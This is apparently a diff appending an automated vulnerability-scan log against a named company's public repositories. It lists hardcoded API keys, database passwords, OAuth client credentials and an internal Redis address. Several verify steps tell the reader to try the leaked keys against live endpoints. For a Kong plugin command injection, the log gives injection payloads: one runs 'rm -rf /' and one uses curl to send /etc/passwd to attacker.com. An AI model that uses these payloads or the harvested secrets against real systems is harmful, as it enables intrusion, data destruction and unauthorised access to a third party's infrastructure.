@@ -391,3 +391,117 @@ TARGET_ORG not configured for sipgate; skipping public-org deep scan.
 TARGET_ORG not configured for sipgate; skipping public-org deep scan.
 ## REPOSCAN 2026-09-09 22:24:46 UTC
 TARGET_ORG not configured for sipgate; skipping public-org deep scan.
+## REPOSCAN 2026-09-10 00:35:37 UTC
+[HYP] Hardcoded Internal Redis Endpoint (RFC-1918) Across 15 CLINQ Bridge Repos
+class: MISCONFIG
+asset: sipgate/clinq-bridge-{sipgate,hubspot,google,pipedrive,salesforce,zoho,zammad,freshsales,copper,agilecrm,1sales,outlook,pipeliner,moco,podio}/k8s/template/deployment.yml:47
+confidence: 95
+reasoning: All 15 deployment manifests hardcode `REDIS_URL: rediss://10.37.248.211:6378` — internal RFC-1918 IP with TLS Redis on non-standard port 6378. GCP project `clinq-services`, zone `europe-west3` confirmed via cloudbuild.yaml.
+impact: HIGH — Exposes internal Redis endpoint; aids lateral movement or targeted SSRF if any internal-facing service is reachable.
+verify_steps: 1) DNS/ICMP 10.37.248.211 from internal network. 2) Verify GCP project `clinq-services` zone `europe-west3` still hosts this Redis. 3) Confirm `rediss://` TLS termination.
+[HYP] TLS Certificate Verification Disabled for Redis Connection
+class: MISCONFIG
+asset: sipgate/clinq-bridge-sipgate/src/cache/storage/redis-storage-adapter.ts:22
+confidence: 90
+reasoning: Redis client connects with `tls: { rejectUnauthorized: false }`, disabling TLS certificate verification. Allows MITM on Redis connections despite `rediss://` (TLS) scheme.
+impact: MEDIUM — Enables man-in-the-middle on Redis connections. Cached contact data could be intercepted or tampered with.
+verify_steps: 1) Confirm production deployment uses `rediss://` URL. 2) Verify whether this setting is overridden via environment variables.
+[HYP] Hardcoded API Keys and DB Credentials in Radau docker-compose.yml
+class: SECRET
+asset: sipgate/radau/docker-compose.yml:18-21
+confidence: 95
+reasoning: Hardcoded plaintext: `API_KEY_MANAGEMENT=pYWVcrR4DmgCfkfmEte5nGNW`, `API_KEY_RADIUS=u39fNShDX6fAeXtWY6bZWY9x`, `DB_PASSWORD=wifi`, `POSTGRES_PASSWORD=wifi`, `POSTGRES_USER=wifi`. README confirms radau is a live WPA Enterprise RADIUS microservice.
+impact: MEDIUM — If any radau instance uses these default keys, the management API (user create/delete/token management) is fully exposed.
+verify_steps: 1) Send Authorization header with these keys to any radau `/user` or `/token` endpoint. 2) Verify GCP project `clinq-services` doesn't also host radau. 3) Test keys against OpenAPI spec at `/docs/openapi.yml`.
+[HYP] Default CORS AllowAllOrigins + AllowCredentials in Radau
+class: MISCONFIG
+asset: sipgate/radau/main.go:16-17
+confidence: 85
+reasoning: When `CORS_ORIGINS` env var is not set (default), `initCORSConfig()` sets `corsConfig.AllowAllOrigins = true` + `corsConfig.AllowCredentials = true`. Any origin can make credentialed cross-origin requests. `Authorization` header is also explicitly allowed.
+impact: MEDIUM — Attacker-controlled page can perform cross-origin requests with user's API key/JWT, enabling account takeover or data exfiltration.
+verify_steps: 1) Confirm default path (no `CORS_ORIGINS` env) is the production configuration. 2) Verify `AllowAllOrigins + AllowCredentials` is exploitable from `evil.com`. 3) Check if reverse proxy strips CORS headers.
+[HYP] OS Command Injection in Kong JWT Firebase Plugin via JWT `kid` Header
+class: SSRF
+asset: sipgate/kong-plugin-jwt-firebase/kong/plugins/jwt-firebase/handler.lua:31-34
+confidence: 95
+reasoning: `grab_public_key_bykid(t_kid)` concatenates JWT header `kid` value directly into shell command: `local cmd = "wget -qO - " .. google_url .. " | grep -i " .. t_kid .. magic`. A crafted JWT with malicious kid (e.g. `"; rm -rf / #") would execute arbitrary OS commands via `io.popen(cmd)`. No sanitization or escaping.
+impact: CRITICAL — RCE on the Kong gateway node; attacker controls the full JWT header. Affects any Kong instance running this plugin.
+verify_steps: 1) Deploy the plugin with a Firebase project_id. 2) Send request with JWT containing kid: `"; curl attacker.com/exfil?data=$(cat /etc/passwd) #". 3) Observe outbound request to attacker.com or command execution.
+[HYP] Secondary Injection Vector + Bug in push_public_key_into_file
+class: OTHER
+asset: sipgate/kong-plugin-jwt-firebase/kong/plugins/jwt-firebase/handler.lua:47-50
+confidence: 90
+reasoning: `push_public_key_into_file()` constructs: `echo -n " .. publickey .. " > " .. shm`. If `grab_public_key_bykid` returns output containing shell metacharacters, the echo command is vulnerable to injection. Additionally, line 48 has typo `cmd_handlel:close()` (should be `cmd_handle`), causing Lua runtime error and leaving SHM file in undefined state.
+impact: HIGH — Secondary injection vector; typo means new keys are never properly saved, degrading security posture.
+verify_steps: 1) Trace call path: `do_authentication → grab_public_key_bykid → push_public_key_into_file`. 2) Verify `cmd_handlel` typo causes Lua error. 3) Confirm SHM write is never reached.
+[HYP] Hardcoded OAuth Client Credentials in REST API Example
+class: SECRET
+asset: sipgate/rest-api-examples/webapp-nodejs/.npmrc.dist:2-3
+confidence: 65
+reasoning: Contains `client_id=2414245-0-e24e0091-8265-11e7-93e7-e5fb754b756f` and `client_secret=187812ce-b546-4fa9-96e8-771e9775c3cb`. Follow sipgate OAuth client credential format. `.dist` template ships real-looking credentials (not placeholders). README instructs users to copy to `.npmrc` (gitignored).
+impact: LOW-MEDIUM — If sipgate OAuth server hasn't revoked this credential, it could be used to obtain access tokens. Even if revoked, reveals exact credential format.
+verify_steps: 1) Attempt OAuth token exchange using these credentials against `https://api.sipgate.com/login/third-party/protocol/openid-connect/token`. 2) Check if client is in sipgate's developer portal. 3) Verify `.gitignore` excludes `.npmrc`.
+[HYP] Hardcoded Session Secret in REST API Example
+class: OTHER
+asset: sipgate/rest-api-examples/webapp-nodejs/index.js:30
+confidence: 70
+reasoning: Express session middleware uses `secret: 'sipgate-rest-api-demo'` — hardcoded, publicly known signing key. Committed to public repo. Establishes pattern that could be copy-pasted into production.
+impact: LOW — Session fixation risk if used in production. In example repo, impact limited to demonstrating insecure pattern.
+verify_steps: 1) Verify no production instances copy this exact secret. 2) Check if session secret is overridable via environment variable.
+[HYP] Default Cookie Secret in Ansible Logger (Slim Framework)
+class: MISCONFIG
+asset: sipgate/ansible-logger/ansible-logger-web/includes/Slim/Slim.php:307
+confidence: 70
+reasoning: Default cookie secret key set to `'CHANGE_ME'`. Also, `cookies.secure` and `cookies.httponly` are both set to `false`. If deployed without changing, session cookies can be forged.
+impact: LOW — Session forgery if ansible-logger is deployed in production with default config.
+verify_steps: 1) Check if ansible-logger is deployed in production. 2) Verify if secret was changed from default.
+[HYP] Hardcoded Internal Dev URLs in sipgategcx Browser Extension
+class: MISCONFIG
+asset: sipgate/sipgategcx/manifest.json (permissions list)
+confidence: 70
+reasoning: Browser extension manifest exposes internal API endpoints: `http://api.dev.sipgate.net/RPC2` (HTTP, not HTTPS) and `https://samurai.sipgate.net/RPC2`. Reveals internal hostnames and API paths.
+impact: LOW — Information disclosure of internal infrastructure; dev endpoint is HTTP.
+verify_steps: 1) Verify if `api.dev.sipgate.net` and `samurai.sipgate.net` are accessible externally. 2) Check if extension is still maintained.
+[HYP] Hardcoded JWT Secret in AI Demo MCP Server Mock Service
+class: SECRET
+asset: sipgate/sipgate-ai-demo-auth-mcp-server/src/mock-service/server.ts:8
+confidence: 75
+reasoning: `JWT_SECRET = "mock-service-secret-key"` hardcoded in mock authentication service. Used to sign/verify tokens for `/contracts` API. Committed to public repo.
+impact: LOW — Demo/mock service only, but if deployed alongside real services, could forge JWT tokens.
+verify_steps: 1) Check if mock service is deployed in any environment. 2) Verify if JWT_SECRET is overridable via environment variable.
+[HYP] Hardcoded HubSpot OAuth Client ID in K8s Deployment
+class: SECRET
+asset: sipgate/clinq-bridge-hubspot/k8s/template/deployment.yml:50-51
+confidence: 85
+reasoning: `HUBSPOT_CLIENT_ID: 6bd4c77d-7d54-47fe-b637-6be96d8c3c05` hardcoded in plaintext. Callback URL `https://hubspot.bridge.clinq.com/oauth2/callback` also exposed.
+impact: LOW-MEDIUM — Reveals registered OAuth client identity and callback URL. Combined with other findings, enables targeted phishing.
+verify_steps: 1) Verify client ID is registered in HubSpot's developer portal. 2) Check if OAuth app has excessive scopes.
+[HYP] Hardcoded Salesforce OAuth Client ID in K8s Deployment
+class: SECRET
+asset: sipgate/clinq-bridge-salesforce/k8s/template/deployment.yml:50-51
+confidence: 85
+reasoning: `SF_OAUTH_PROVIDER_CLIENT_ID: 3MVG9TSaZ8P6zP1roce2837A2tPdW0m11CDTD2ftXt4UOVzip.GoHEMhsA8V6ILC3Fmv0U6KCYSPecLfH.gQX` hardcoded in plaintext.
+impact: LOW — Reveals registered Salesforce OAuth client identity.
+verify_steps: 1) Verify client ID is registered in Salesforce's developer portal.
+[HYP] Hardcoded Zoho OAuth Client ID in K8s Deployment
+class: SECRET
+asset: sipgate/clinq-bridge-zoho/k8s/template/deployment.yml:52
+confidence: 85
+reasoning: `ZOHO_CLIENT_ID: "1000.ZZIQ2V2WLZOW0HY6WY28XTRLHXPVRR"` hardcoded in plaintext.
+impact: LOW — Reveals registered Zoho OAuth client identity.
+verify_steps: 1) Verify client ID is registered in Zoho's developer portal.
+[HYP] Hardcoded Podio OAuth Client ID in K8s Deployment
+class: SECRET
+asset: sipgate/clinq-bridge-podio/k8s/template/deployment.yml:50
+confidence: 85
+reasoning: `PODIO_CLIENT_ID: clinq-nnhvbx` hardcoded in plaintext.
+impact: LOW — Reveals registered Podio OAuth client identity.
+verify_steps: 1) Verify client ID is registered in Podio's developer portal.
+[HYP] Hardcoded Pipedrive OAuth Client ID in K8s Deployment
+class: SECRET
+asset: sipgate/clinq-bridge-pipedrive/k8s/template/deployment.yml:54
+confidence: 85
+reasoning: `CLIENT_ID: 36bc4ebf413cf06b` hardcoded in plaintext. `CLIENT_SECRET` properly referenced from K8s secret.
+impact: LOW — Reveals registered Pipedrive OAuth client identity.
+verify_steps: 1) Verify client ID is registered in Pipedrive's developer portal.
+TARGET_ORG not configured for sipgate; skipping public-org deep scan.
